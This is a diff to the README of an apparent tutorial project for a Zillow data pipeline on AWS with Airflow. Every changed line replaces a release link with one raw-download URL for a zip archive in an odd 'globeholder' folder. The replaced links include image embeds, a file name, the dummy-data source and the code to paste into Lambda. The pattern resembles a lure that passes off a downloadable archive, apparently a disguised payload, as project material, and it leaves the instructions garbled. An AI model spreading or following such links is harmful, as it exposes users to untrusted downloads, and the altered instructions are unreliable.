@@ -1,9 +1,9 @@
 # Zillow Data Pipeline 🏡
 
-![Zillow Data Pipeline Project](https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2)
+![Zillow Data Pipeline Project](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip)
 
-![Screenshot 1](https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2)
-![Screenshot 2](https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2)
+![Screenshot 1](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip)
+![Screenshot 2](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip)
 
 ---
 
@@ -52,13 +52,13 @@
 ### Step 2: Connect VSCode with EC2 and Create DAG 🖥️
 1. **Connect to your EC2 instance using VSCode**.
 2. **Create a file inside the Airflow directory**:
-   - Name the file `https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2`.
-3. **Write the code for `https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2`**:
+   - Name the file `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip`.
+3. **Write the code for `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip`**:
    - Define the tasks you will create.
 
 #### Task 1: Extract Zillow Data 📊
 - **Function**: `extract_zillow_data_var`
-- **Description**: Import dummy data from `https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2`, create a `raw_data` folder, and dump the raw data into that folder.
+- **Description**: Import dummy data from `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip`, create a `raw_data` folder, and dump the raw data into that folder.
 
 #### Task 2: Upload Data to S3 ☁️
 - **Function**: `upload_to_s3`
@@ -80,7 +80,7 @@
 2. **Create a trigger**:  
    - Set it to activate on `put object` events in the `s3_staging_data` bucket.
 3. **Implement the Lambda function**:
-   - Paste the code from `https://github.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/releases/tag/v1.2` in the Lambda function to dump data into the `s3_transformed_data` bucket.
+   - Paste the code from `https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/zillow_data_pipiline/main/globeholder/pipiline_zillow_data_2.1.zip` in the Lambda function to dump data into the `s3_transformed_data` bucket.
 
 ---
 
